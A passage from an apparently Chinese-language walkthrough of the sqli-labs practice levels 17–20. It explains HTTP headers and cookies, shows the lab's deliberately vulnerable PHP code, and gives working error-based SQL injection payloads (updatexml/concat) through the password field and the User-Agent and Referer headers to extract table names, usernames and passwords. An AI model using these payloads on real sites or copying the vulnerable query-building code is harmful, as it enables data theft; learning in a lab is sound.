language-bash"><code class="language-bash">User Name：adminNew Password：1<span class="token string">' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='</span>security<span class="token string">' AND TABLE_NAME='</span>users' limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/pzOFyx4r6nTv5YU.png" alt="less17-8.png"></p><ol start="6"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">User Name：adminNew Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select username FROM security.users limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/4fhYFeNLEMROWwa.png" alt="less17-9.png"></p><pre class="line-numbers language-bash"><code class="language-bash">User Name：adminNew Password：1' or updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select password FROM security.users limit 0,1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/13/3IMYn4KbgBmftZy.png" alt="less17-10.png"></p><h2 id="Less18"><a href="#Less18" class="headerlink" title="Less18"></a>Less18</h2><p>HTTP 头 useragent 注入</p><hr><h3 id="基础知识-4"><a href="#基础知识-4" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-HTTP-请求头"><a href="#什么是-HTTP-请求头" class="headerlink" title="什么是 HTTP 请求头?"></a>什么是 HTTP 请求头?</h4><p>首先网页是用 HTTP（HyperTextTransferProtocol）超文本传输协议。比如，你（用户/客户端）用浏览器打开一个网页，但是这个网页（html页面）并不是你电脑上的，它是从服务端（网站）上获取的。而 HTTP 就是用户和网站传递网页（html 页面）的一个通信方法。</p><p>在客户端和服务端使用 HTTP 协议通信过程：</p><ol><li><p>客户端发送一个明文的请求信息，告诉服务端：“我要获取哪个网页；我要使用什么方法获取网页；我用的是什么浏览器或工具获取网页；我用的 HTTP 是哪个版本。等等信息”</p></li><li><p>服务端请求信息后会回复：“我用的是 HTTP 的哪个版本回复你的；你请求的内容是正确的还是错误的；根据请求对错回复相应的网页内容”</p></li></ol><p>上面的请求信息，就是请求头。请求头包含请求的方法、URI、协议版本、以及包含请求修饰符、客户信息和内容。</p><h4 id="HTTP-请求头之-user-agent"><a href="#HTTP-请求头之-user-agent" class="headerlink" title="HTTP 请求头之 user-agent"></a>HTTP 请求头之 user-agent</h4><p>User-Agent 是告诉网站服务器，访问者是通过什么工具来请求网页的。</p><p><img src="https://i.loli.net/2019/11/19/s6mTchZjDv5V7SG.png" alt="less18-1.png"></p><p><strong>简要解析：</strong></p><p>我用 firefox 浏览器，查看 User-Agent 的结果</p><pre class="line-numbers language-text"><code class="language-text">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>User-Agent 通常格式：</strong></p><pre class="line-numbers language-text"><code class="language-text">Mozilla/5.0 (平台) 引擎版本 浏览器版本号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="第一部分：Mozilla-5-0"><a href="#第一部分：Mozilla-5-0" class="headerlink" title="第一部分：Mozilla/5.0"></a>第一部分：Mozilla/5.0</h4><p>由于历史上的浏览器大战，当时想获得图文并茂的网页，就必须宣称自己是 Mozilla 浏览器。此事导致如今 User-Agent 里通常都带有 Mozilla 字样，出于对历史的尊重，大家都会默认填写该部分。</p><h4 id="第二部分：平台这部分可由多个字符串组成，用英文半角分号分开"><a href="#第二部分：平台这部分可由多个字符串组成，用英文半角分号分开" class="headerlink" title="第二部分：平台这部分可由多个字符串组成，用英文半角分号分开"></a>第二部分：平台这部分可由多个字符串组成，用英文半角分号分开</h4><p>Windows NT 10.0：是指我使用的操作系统的版本，比如我使用的 win10 对应的就是 Windows NT 10.0，如果我使用 win7 对应的就是Windows NT 6.1。</p><p>Win64;x64：是指我的操作系统是64位的。</p><p>rv:70.0：Gecko 的发布版本号</p><p>注：Gecko 的发布版本号与 firefox  的版本号相同</p><h5 id="Windows系统下："><a href="#Windows系统下：" class="headerlink" title="Windows系统下："></a>Windows系统下：</h5><pre class="line-numbers language-text"><code class="language-text">Windows NT 5.0 // 如 Windows 2000 Windows NT 5.1 // 如 Windows XPWindows NT 6.0 // 如 Windows Vista Windows NT 6.1 // 如 Windows 7Windows NT 6.2 // 如 Windows 8Windows NT 6.3 // 如 Windows 8.1Windows NT 10.0 // 如 Windows 10Win64; x64 // Win64 on x64WOW64 // Win32 on x64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Linux系统下："><a href="#Linux系统下：" class="headerlink" title="Linux系统下："></a>Linux系统下：</h5><pre class="line-numbers language-text"><code class="language-text">X11; Linux i686; // Linux 桌面，i686 版本X11; Linux x86_64; // Linux 桌面，x86_64 版本X11; Linux i686 on x86_64 // Linux 桌面，运行在 x86_64 的 i686 版本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="macOS系统下："><a href="#macOS系统下：" class="headerlink" title="macOS系统下："></a>macOS系统下：</h5><pre class="line-numbers language-text"><code class="language-text">Macintosh; Intel Mac OS X 10_9_0 // Intel x86 或者 x86_64Macintosh; PPC Mac OS X 10_9_0 // PowerPCMacintosh; Intel Mac OS X 10.12; // 不用下划线，用点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="第三部分：引擎版本"><a href="#第三部分：引擎版本" class="headerlink" title="第三部分：引擎版本"></a>第三部分：引擎版本</h4><p>引擎指是排版引擎（页面渲染引擎），主要负责取得网页的内容（HTML、XML、图象等等）、整理信息（例如加入CSS等），以及计算网页的显示方式然后会输出至显示器或打印机。</p><p>Gecko 是套开放源代码的、以 C++ 编写的网页排版引擎。Gecko 是跨平台的，能在 Microsoft Windows、Linux 和 Mac OS X 等主要操作系统上运行。它是最流行的排版引擎之一，其流行程度仅次于Trident。</p><h4 id="浏览器版本"><a href="#浏览器版本" class="headerlink" title="浏览器版本"></a>浏览器版本</h4><p>本人用的是 firefox 浏览器，其中版本为 70.0 。</p><h3 id="注入步骤-7"><a href="#注入步骤-7" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li></ol><p><img src="https://i.loli.net/2019/11/19/jD21NIfO45EmrJ8.png" alt="less18-2.png"></p><p><img src="https://i.loli.net/2019/11/19/hW8uyoECJ2kl7BR.png" alt="less18-3.png"></p><ol start="2"><li><strong>查看源代码，发现 uname 和 passwd 已经被检查过滤了</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>继续查看源代码，会发现一个数据库插入语句，同时找到了网页最后的输出信息</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">$uagent = $_SERVER['HTTP_USER_AGENT'];$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";echo 'Your User Agent is: ' .$uagent;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><strong>使用 modify headers 修改 user-agent 尝试从 HTTP_USER_AGENT 进行注入</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">' or updatexml(1,concat(0x7e,(database()),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/19/vR2Oj6IXdZbmKQc.png" alt="less18-4.png"></p><p><img src="https://i.loli.net/2019/11/19/79qik3cOvUQMrsA.png" alt="less18-5.png"></p><p>注：modify headers 插件在 firefox 没有生效，在 chrome 生效。</p><ol start="5"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/19/frjIm8HdKZ6GERN.png" alt="less18-6.png"></p><ol start="6"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/19/SWIt5cZbDzriKVa.png" alt="less18-7.png"></p><ol start="7"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select username FROM security.users limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/19/1tKOxrTbRFZzLM2.png" alt="less18-8.png"></p><h2 id="Less19"><a href="#Less19" class="headerlink" title="Less19"></a>Less19</h2><p>HTTP 头 referer 注入，本关注入的前提是必须要知道用户名和密码</p><hr><h3 id="基础知识-5"><a href="#基础知识-5" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="HTTP-请求头之-referer"><a href="#HTTP-请求头之-referer" class="headerlink" title="HTTP 请求头之 referer"></a>HTTP 请求头之 referer</h4><p>HTTP 请求的头信息里面，Referer 是一个常见字段，简单来说就是告诉服务器我是从哪个 ”链接“ 来访问这个网页的。</p><p>有趣的是，这个字段的拼写是错的。Referer的正确拼写是Referrer，但是写入标准的时候，不知为何，没人发现少了一个字母r。标准定案以后，只能将错就错，所有头信息的该字段都一律错误拼写成Referer。</p><p><strong>用途：</strong></p><ol><li>获取访问来源，统计访问流量的来源和搜索的关键词，分析用户的兴趣爱好、收集日志、优化缓存等等</li></ol><p>比如说用户点开百度的一个链接，他的服务器就能够从 HTTP Referer 中统计出每天有多少用户点击了该链接来访问这个网站</p><ol start="2"><li>防盗链</li></ol><p>通过分析访问源，拒绝非法访问，主要是图片和网盘服务器使用的较多。</p><h3 id="注入步骤-8"><a href="#注入步骤-8" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li></ol><p><img src="https://i.loli.net/2019/11/20/q238Rea7khFvtUg.png" alt="less19-1.png"></p><p><img src="https://i.loli.net/2019/11/20/o67cW3BwYnJetT1.png" alt="less19-2.png"></p><ol start="2"><li><strong>查看源代码，发现 uname 和 passwd 已经被检查过滤了</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">$uname = check_input($_POST['uname']);$passwd = check_input($_POST['passwd']);$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>继续查看源代码，会发现一个数据库插入语句，同时找到了网页最后的输出信息</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">$uagent = $_SERVER['HTTP_REFERER'];$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";echo 'Your Referer is: ' .$uagent;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="4"><li><strong>使用 modify headers 修改 referer 尝试从 HTTP_REFERER 进行注入</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">' or updatexml(1,concat(0x7e,(database()),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/20/jIHqxRLOE5b4KYF.png" alt="less19-3.png"><br><img src="https://i.loli.net/2019/11/20/uMJITCxA8rl5kcD.png" alt="less19-4.png"></p><ol start="5"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/20/6wKNvcOAaxfDsJo.png" alt="less19-5.png"></p><ol start="6"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/20/1W3YXuqdbSBLnlZ.png" alt="less19-6.png"></p><ol start="7"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">1' or updatexml(1,concat(0x7e,(select username FROM security.users limit 0,1),0x7e),1), '','')#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/20/bhGZ1PJE8k2Au47.png" alt="less19-7.png"></p><h2 id="Less20"><a href="#Less20" class="headerlink" title="Less20"></a>Less20</h2><p>HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p><hr><h3 id="基础知识-6"><a href="#基础知识-6" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="cookie起源"><a href="#cookie起源" class="headerlink" title="cookie起源"></a>cookie起源</h4><p>早期的 Web 应用面临的最大问题之一就是如何维持状态。简言之，服务器无法知道两个请求是否来自于同一个浏览器。当时，最简单的办法就是在请求的页面中插入一个 token，然后在下次请求时将这个 token 返回至服务器。这需要在页面的 form 表单中插入一个包含 token 的隐藏域，或者将 token 放在 URL 的 query 字符串中来传递。这两种方法都需要手动操作，而且极易出错。</p><p>当时网景通讯的一名员工 Lou Montulli，在 1994 年将 “magic cookies” 的概念应用到 Web 通讯中。他试图解决 Web 的第一个购物车应用，现在购物车成了购物网站的支柱。他的原始说明文档提供了 cookie 工作原理的基本信息，该文档后来被作为规范纳入到 RFC 2109（大多数浏览器的实现参考文档）中，最终被纳入到 RFC 2965 中。Montulli 也被授予 cookie 的美国专利。网景浏览器在它的第一个版本中就开始支持 cookie，现在所有 Web 浏览器都支持 cookie。</p><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>简单地说，cookie 就是浏览器储存在用户电脑上的一小段文本文件。cookie 是纯文本格式，不包含任何可执行的代码。一个 Web 页面或服务器告知浏览器按照一定规范来储存这些信息，并在随后的请求中将这些信息发送至服务器，Web 服务器就可以使用这些信息来识别不同的用户。大多数需要登录的网站在用户验证成功之后都会设置一个 cookie，只要这个 cookie 存在并有效，用户就可以自由浏览这个网站的任意页面。再次说明，cookie 只包含数据，就其本身而言并不有害。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>Cookie 总是保存在客户端中，按在客户端中的存储位置，可分为内存 Cookie 和硬盘 Cookie。</p><p>内存 Cookie 由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘 Cookie 保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘 Cookie 不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久 Cookie 和持久 Cookie。</p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。</p><p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。</p><p>Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。</p><h4 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h4><ol><li>Cookie会被附加在每个HTTP请求中，所以无形中增加了流量。</li><li>由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题，除非用HTTPS。</li><li>Cookie的大小限制在4KB左右，对于复杂的存储需求来说是不够用的。</li></ol><h3 id="注入步骤-9"><a href="#注入步骤-9" class="headerlink" title="注入步骤"></a>注入步骤</h3><ol><li><strong>在 username 和 password 中输入测试字符串，发现没有任何用,当输入正确时会多出一行信息</strong></li></ol><p><img src="https://i.loli.net/2019/11/22/QcOkfpNzvxTlXY4.png" alt="less20-1.png"></p><p><img src="https://i.loli.net/2019/11/22/Knt5jYJu3x2PwMp.png" alt="less20-2.png"></p><ol start="2"><li><strong>首先判断有无cookie，没有的话，查询出来再设置cookie</strong></li></ol><pre class="line-numbers language-php"><code class="language-php">                <span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token function">check_input</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span><span class="token punctuation">;</span>                <span class="token variable">$result1</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$row1</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row1</span><span class="token punctuation">)</span>                                <span class="token punctuation">{</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span><span class="token punctuation">;</span>                                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$cookee</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"I LOVE YOU COOKIES"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#0000ff" font size = 3 &gt;'</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//echo 'Your Cookie is: ' .$cookee;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/flag.jpg" /&gt;'</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li><strong>若 cookie 存在，又分两种情况， 第一种情况，你登陆过，cookie 还有效，你没按删除 cookie 的按钮，那么他就输出各种信息，包括删除 cookie 的按钮</strong></li></ol><pre class="line-numbers language-php"><code class="language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token punctuation">{</span>                        <span class="token variable">$cookee</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token variable">$format</span> <span class="token operator">=</span> <span class="token string">'D d M Y - H:i:s'</span><span class="token punctuation">;</span>                        <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">3600</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;center&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;font color= "red" font size="4"&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"YOUR USER AGENT IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "cyan" font size="4"&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"YOUR IP ADDRESS IS : "</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;br&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 4 &gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;"</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "orange" font size = 5 &gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"YOUR COOKIE : uname = $cookee and expires: "</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token variable">$format</span><span class="token punctuation">,</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;/font&gt;"</span><span class="token punctuation">;</span>                        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span><span class="token punctuation">;</span>                        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$result</span><span class="token punctuation">)</span>                                <span class="token punctuation">{</span>                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Issue with your mysql: '</span> <span class="token punctuation">.</span> <span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>                                <span class="token punctuation">{</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "pink" font size="5"&gt;'</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'Your Login name:'</span><span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "grey" font size="5"&gt;'</span><span class="token punctuation">;</span>                                  <span class="token keyword">echo</span> <span class="token string">'Your Password:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;/font&gt;&lt;/b&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'Your ID:'</span> <span class="token punctuation">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                <span class="token punctuation">}</span>                        <span class="token keyword">else</span>                                <span class="token punctuation">{</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;center&gt;"</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">'&lt;img src="../images/slap1.jpg" /&gt;'</span><span class="token punctuation">;</span>                                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span><span class="token punctuation">;</span>                                <span class="token comment" spellcheck="true">//echo '&lt;img src="../images/Less-20.jpg" /&gt;';</span>                                <span class="token punctuation">}</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;center&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;form action="" method="post"&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;/form&gt;'</span><span class="token punctuation">;</span>                        <span class="token keyword">echo</span> <span class="token string">'&lt;/center&gt;'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="4"><li><strong>第二种情况，你按了删除cookie的按钮,后台就把cookie的时间设置为过期的时间，那么cookie就被删除了</strong></li></ol><pre class="line-numbers language-php"><code class="language-php">        <span class="token keyword">else</span>                <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'&lt;center&gt;'</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token 